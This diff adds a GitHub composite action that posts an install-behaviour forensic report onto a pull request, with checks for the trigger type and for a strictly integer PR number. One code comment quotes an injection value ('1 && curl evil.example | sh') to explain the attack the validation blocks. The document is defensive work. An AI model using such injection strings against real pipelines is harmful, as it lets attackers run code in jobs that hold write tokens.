@@ -1,0 +1,158 @@
+name: "InstallScope — comment"
+description: >-
+  Posts the forensic report from a completed recording run onto its pull request. Runs on
+  `workflow_run` so it holds a write-capable token in a job that never executes code from the pull
+  request. Reads only the uploaded artifact.
+author: "mukti-sys"
+
+branding:
+  icon: "message-square"
+  color: "orange"
+
+inputs:
+  artifact-name:
+    description: "Artifact written by installscope/record. Must match that action's artifact-name."
+    required: false
+    default: "installscope-report"
+  token:
+    description: >-
+      Token used to post the comment. Needs `pull-requests: write` and nothing else.
+    required: false
+    default: ${{ github.token }}
+  marker:
+    description: >-
+      Hidden HTML marker identifying this bot's comment, so a re-run updates the existing one rather
+      than adding a second. Change it only if two InstallScope configurations must comment separately.
+    required: false
+    default: "<!-- installscope-report -->"
+
+outputs:
+  commented:
+    description: "true when a comment was posted or updated."
+    value: ${{ steps.post.outputs.commented }}
+
+runs:
+  using: "composite"
+  steps:
+    - name: Refuse to run outside workflow_run
+      shell: bash
+      run: |
+        set -euo pipefail
+        # This action's whole reason for existing is that it holds a write token in a job that did not run
+        # untrusted code. On a `pull_request` trigger it would be running alongside the code it is
+        # reporting on, which defeats the split entirely.
+        if [ "${GITHUB_EVENT_NAME}" != "workflow_run" ]; then
+          echo "::error title=Wrong trigger::installscope/comment must run on 'workflow_run'. On any other trigger it would hold a write token in the same job as untrusted code. See action/README.md."
+          exit 1
+        fi
+        echo "trigger workflow_run confirmed"
+
+    - name: Download the report artifact
+      id: download
+      uses: actions/download-artifact@v4
+      continue-on-error: true
+      with:
+        name: ${{ inputs.artifact-name }}
+        path: installscope-artifact
+        run-id: ${{ github.event.workflow_run.id }}
+        github-token: ${{ inputs.token }}
+
+    - name: Validate the artifact before trusting anything in it
+      id: validate
+      shell: bash
+      run: |
+        set -euo pipefail
+
+        if [ ! -d installscope-artifact ]; then
+          # No artifact means the recording workflow decided there was nothing to record, or it failed
+          # before uploading. Neither is this job's problem to report, and posting "something went wrong"
+          # on every unrelated PR would train people to ignore the bot.
+          echo "no artifact from the recording run; nothing to comment on"
+          echo "ready=false" >> "$GITHUB_OUTPUT"
+          exit 0
+        fi
+
+        if [ ! -f installscope-artifact/pr.txt ]; then
+          echo "the artifact carries no PR number; nothing to comment on"
+          echo "ready=false" >> "$GITHUB_OUTPUT"
+          exit 0
+        fi
+
+        # THE validation. This file was written by a job that ran untrusted install scripts, so its
+        # contents are attacker-influenced. A value like `1 && curl evil.example | sh` reaching a shell
+        # would be a command injection in the one job that holds a write token.
+        #
+        # Checked with a strict pattern rather than sanitised: a PR number is either a plain positive
+        # integer or it is not a PR number, and there is nothing to salvage in the second case.
+        pr_number="$(tr -d '[:space:]' < installscope-artifact/pr.txt)"
+        if ! printf '%s' "$pr_number" | grep -Eq '^[1-9][0-9]{0,9}$'; then
+          echo "::error title=Refusing untrusted input::the artifact's PR number is not a plain positive integer; refusing to use it"
+          exit 1
+        fi
+
+        if [ ! -f installscope-artifact/installscope-comment.md ]; then
+          echo "::error title=Incomplete artifact::the artifact has a PR number but no rendered comment"
+          exit 1
+        fi
+
+        echo "pr-number=$pr_number" >> "$GITHUB_OUTPUT"
+        echo "ready=true" >> "$GITHUB_OUTPUT"
+        echo "will comment on PR #$pr_number"
+
+    - name: Assemble the comment body
+      if: steps.validate.outputs.ready == 'true'
+      shell: bash
+      env:
+        MARKER: ${{ inputs.marker }}
+        RUN_ID: ${{ github.event.workflow_run.id }}
+      run: |
+        set -euo pipefail
+
+        # The marker is first so `gh` can find this bot's previous comment and update it in place. Posting
+        # a new comment per push would bury the PR conversation, and a maintainer reading a dependency PR
+        # is the person this product is for.
+        printf '%s\n' "$MARKER" > comment-body.md
+        cat installscope-artifact/installscope-comment.md >> comment-body.md
+
+        # The behavioral diff, when the registry held an earlier recording. Collapsed, because the finding
+        # report is the headline and the diff is supporting evidence (Design.md:28's hierarchy).
+        if [ -f installscope-artifact/installscope-diff.md ]; then
+          {
+            printf '\n<details><summary>How this install compares with the previous recording</summary>\n\n'
+            cat installscope-artifact/installscope-diff.md
+            printf '\n</details>\n'
+          } >> comment-body.md
+        fi
+
+        printf '\n<sub>Full evidence: %s/%s/actions/runs/%s</sub>\n' \
+          "$GITHUB_SERVER_URL" "$GITHUB_REPOSITORY" "$RUN_ID" >> comment-body.md
+
+        echo "--- comment body ---"
+        cat comment-body.md
+
+    - name: Post or update the comment
+      id: post
+      if: steps.validate.outputs.ready == 'true'
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.token }}
+        PR_NUMBER: ${{ steps.validate.outputs.pr-number }}
+        MARKER: ${{ inputs.marker }}
+      run: |
+        set -euo pipefail
+
+        # `gh api` rather than a third-party action: Architecture.md:42 asks for bash plus gh api, and it
+        # keeps the job that holds the write token free of dependencies nobody in this repository reviews.
+        existing="$(gh api "repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" \
+          --paginate --jq ".[] | select(.body | startswith(\"${MARKER}\")) | .id" | head -n 1)"
+
+        if [ -n "$existing" ]; then
+          gh api --method PATCH "repos/${GITHUB_REPOSITORY}/issues/comments/${existing}" \
+            -F body=@comment-body.md > /dev/null
+          echo "updated comment $existing on PR #${PR_NUMBER}"
+        else
+          gh api --method POST "repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" \
+            -F body=@comment-body.md > /dev/null
+          echo "posted a new comment on PR #${PR_NUMBER}"
+        fi
+        echo "commented=true" >> "$GITHUB_OUTPUT"
